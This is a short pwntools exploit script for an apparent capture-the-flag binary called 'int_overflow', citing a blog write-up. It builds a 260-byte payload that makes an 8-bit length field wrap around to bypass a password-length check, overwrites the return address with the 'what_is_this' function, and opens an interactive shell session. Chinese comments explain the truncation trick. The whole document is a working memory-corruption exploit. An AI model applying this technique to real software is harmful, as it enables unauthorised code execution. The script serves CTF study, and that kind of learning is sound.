from pwn import *
# https://sphandsomejack.github.io/2020/02/01/int_overflow/
sh = process("./int_overflow")
elf = ELF("./int_overflow")

system_addr = elf.symbols['what_is_this']
payload = b'a'*24 + p32(system_addr)
payload = payload.ljust(260, b'a')      # 通过整数溢出绕过密码长度检测
# 由于v8本身只有8位，所以超过8位的，就会发生高位截断，只会保留低位
# 所以只要让payload的长度在(259,264]内，就能让v8的值在(3,8]内，才能通过密码长度检测。

sh.sendlineafter("choice:", '1')
sh.sendlineafter("username:", 'aaa')
sh.sendlineafter("passwd:", payload)
sh.interactive()